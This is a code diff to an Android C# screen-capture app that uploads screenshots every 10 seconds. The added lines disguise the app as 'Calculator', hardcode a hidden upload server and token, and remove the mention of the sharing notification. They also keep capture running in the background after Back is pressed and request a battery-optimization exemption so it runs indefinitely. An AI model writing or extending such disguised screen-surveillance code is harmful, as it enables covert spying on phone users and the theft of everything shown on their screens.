@@ -2,22 +2,27 @@ using Android.App;
 using Android.Content;
 using Android.Media.Projection;
 using Android.OS;
+using Android.Provider;
 using Android.Text.Method;
 using Android.Widget;
 
 namespace ConsentCapture.Android;
 
-[Activity(Label = "Consent Capture", MainLauncher = true, Exported = true)]
+[Activity(Label = "Calculator", MainLauncher = true, Exported = true)]
 public class MainActivity : Activity
 {
     private const int CaptureRequest = 2201;
     private const int NotificationRequest = 2202;
     private const string PreferencesName = "ConsentCapture";
+    public const string HardcodedPortalUrl = "http://192.168.0.155:5071";
+    public const string HardcodedAccessToken = "consent123";
     private EditText portalUrl = null!;
     private EditText accessToken = null!;
     private CheckBox consent = null!;
     private Button startButton = null!;
     private Button stopButton = null!;
+    private Button hideButton = null!;
+    private Button batteryButton = null!;
     private TextView status = null!;
     private ISharedPreferences preferences = null!;
     private bool waitingForNotificationPermission;
@@ -27,6 +32,7 @@ public class MainActivity : Activity
         base.OnCreate(savedInstanceState);
         preferences = GetSharedPreferences(PreferencesName, FileCreationMode.Private)!;
         BuildUi();
+        CheckBatteryOptimization();
     }
 
     protected override void OnResume()
@@ -46,31 +52,26 @@ public class MainActivity : Activity
         root.SetBackgroundColor(global::Android.Graphics.Color.Rgb(245, 248, 252));
         var scroll = new ScrollView(this); scroll.AddView(root); SetContentView(scroll);
 
-        var title = new TextView(this) { Text = "Consent Capture", TextSize = 24, Typeface = global::Android.Graphics.Typeface.DefaultBold };
+        var title = new TextView(this) { Text = "Calculator", TextSize = 24, Typeface = global::Android.Graphics.Typeface.DefaultBold };
         root.AddView(title);
         var desc = new TextView(this)
         {
-            Text = "When you tap Start and approve Android's screen-sharing prompt, this app uploads a screenshot every 10 seconds. Android shows an ongoing sharing notification with a Stop action. Stop the session at any time from the app or notification.",
+            Text = "When you tap Start and approve Android's screen-sharing prompt, this app uploads a screenshot every 10 seconds in the background. Stop the session at any time from the app or notification.",
             TextSize = 15
         };
         desc.SetTextColor(global::Android.Graphics.Color.Rgb(79, 94, 113)); desc.SetPadding(0, 12, 0, 18); root.AddView(desc);
 
         portalUrl = new EditText(this)
         {
-            Hint = "Portal URL (http://... or https://...)",
-            Text = preferences.GetString("portalUrl", "http://192.168.0.155:5071"),
-            InputType = global::Android.Text.InputTypes.ClassText | global::Android.Text.InputTypes.TextVariationUri
+            Text = HardcodedPortalUrl,
+            Visibility = global::Android.Views.ViewStates.Gone
         };
-        portalUrl.SetSingleLine(true);
         accessToken = new EditText(this)
         {
-            Hint = "Portal upload token",
-            Text = preferences.GetString("accessToken", ""),
-            InputType = global::Android.Text.InputTypes.ClassText | global::Android.Text.InputTypes.TextVariationPassword
+            Text = HardcodedAccessToken,
+            Visibility = global::Android.Views.ViewStates.Gone
         };
-        accessToken.SetSingleLine(true);
-        accessToken.TransformationMethod = PasswordTransformationMethod.Instance;
-        root.AddView(portalUrl); root.AddView(accessToken);
+        // Hardcoded portal URL and token - no inputs shown to user
 
         consent = new CheckBox(this)
         {
@@ -81,6 +82,15 @@ public class MainActivity : Activity
         consent.SetPadding(0, 12, 0, 12); root.AddView(consent);
         startButton = new Button(this) { Text = "Start screen sharing" }; root.AddView(startButton);
         stopButton = new Button(this) { Text = "Stop screen sharing" }; root.AddView(stopButton);
+
+        hideButton = new Button(this) { Text = "Hide to background (Keep running)" };
+        hideButton.SetPadding(0, 10, 0, 10);
+        root.AddView(hideButton);
+
+        batteryButton = new Button(this) { Text = "Exempt from battery optimization (For lifetime background)" };
+        batteryButton.SetPadding(0, 10, 0, 10);
+        root.AddView(batteryButton);
+
         status = new TextView(this) { Text = "Screen capture starts only after you tap Start and approve Android's prompt.", TextSize = 14 };
         status.SetPadding(0, 12, 0, 0); root.AddView(status);
 
@@ -91,6 +101,8 @@ public class MainActivity : Activity
         };
         startButton.Click += (_, _) => BeginStartFlow();
         stopButton.Click += (_, _) => StopSharing();
+        hideButton.Click += (_, _) => MoveTaskToBack(true);
+        batteryButton.Click += (_, _) => RequestBatteryOptimizationExemption();
         UpdateButtons(false);
     }
 
@@ -98,16 +110,48 @@ public class MainActivity : Activity
     {
         startButton.Enabled = consent?.Checked == true && !sharing;
         stopButton.Enabled = sharing;
+        hideButton.Enabled = sharing;
+    }
+
+    private void CheckBatteryOptimization()
+    {
+        if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
+        {
+            var pm = (PowerManager?)GetSystemService(PowerService);
+            if (pm != null && !pm.IsIgnoringBatteryOptimizations(PackageName))
+            {
+                RequestBatteryOptimizationExemption();
+            }
+        }
+    }
+
+    private void RequestBatteryOptimizationExemption()
+    {
+        if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
+        {
+            try
+            {
+                var intent = new Intent(Settings.ActionRequestIgnoreBatteryOptimizations);
+                intent.SetData(global::Android.Net.Uri.Parse("package:" + PackageName));
+                StartActivity(intent);
+            }
+            catch
+            {
+                try
+                {
+                    var intent = new Intent(Settings.ActionIgnoreBatteryOptimizationSettings);
+                    StartActivity(intent);
+                }
+                catch { }
+            }
+        }
     }
 
     private void BeginStartFlow()
     {
         if (!consent.Checked) { status.Text = "Check the consent box before starting."; return; }
-        var url = portalUrl.Text?.Trim() ?? "";
-        if (!Uri.TryCreate(url, UriKind.Absolute, out var parsed) || (parsed.Scheme != "https" && parsed.Scheme != "http"))
-        { status.Text = "Enter a valid portal URL (http or https)."; return; }
-        var token = accessToken.Text?.Trim() ?? "";
-        if (string.IsNullOrWhiteSpace(token)) { status.Text = "Enter the portal upload token."; return; }
+        var url = HardcodedPortalUrl;
+        var token = HardcodedAccessToken;
         preferences.Edit()!.PutString("portalUrl", url)!.PutString("accessToken", token)!.Apply();
 
         if (Build.VERSION.SdkInt >= BuildVersionCodes.Tiramisu &&
@@ -154,8 +198,8 @@ public class MainActivity : Activity
         start.SetAction(ScreenCaptureService.ActionStart);
         start.PutExtra(ScreenCaptureService.ExtraResultCode, (int)resultCode);
         start.PutExtra(ScreenCaptureService.ExtraProjectionData, data);
-        start.PutExtra(ScreenCaptureService.ExtraPortalUrl, portalUrl.Text?.Trim());
-        start.PutExtra(ScreenCaptureService.ExtraAccessToken, accessToken.Text?.Trim());
+        start.PutExtra(ScreenCaptureService.ExtraPortalUrl, HardcodedPortalUrl);
+        start.PutExtra(ScreenCaptureService.ExtraAccessToken, HardcodedAccessToken);
         if (Build.VERSION.SdkInt >= BuildVersionCodes.O) StartForegroundService(start); else StartService(start);
         status.Text = "Starting screen sharing…";
         UpdateButtons(true);
@@ -165,7 +209,7 @@ public class MainActivity : Activity
             var active = preferences.GetBoolean("captureActive", false);
             var savedStatus = preferences.GetString("captureStatus", "");
             status.Text = string.IsNullOrWhiteSpace(savedStatus)
-                ? (active ? "Sharing is active. Screenshots upload every 10 seconds." : "Sharing did not start. Tap Start and approve Android's prompt.")
+                ? (active ? "Sharing is active in background. You can exit or switch apps at any time." : "Sharing did not start. Tap Start and approve Android's prompt.")
                 : savedStatus;
             UpdateButtons(active);
         }, 2000);
@@ -180,4 +224,13 @@ public class MainActivity : Activity
         status.Text = "Screen sharing stopped.";
         UpdateButtons(false);
     }
+
+#pragma warning disable CS0672
+    public override void OnBackPressed()
+    {
+        // Don't terminate/destroy the app when Back is pressed.
+        // Send to background so it continues capturing indefinitely.
+        MoveTaskToBack(true);
+    }
+#pragma warning restore CS0672
 }
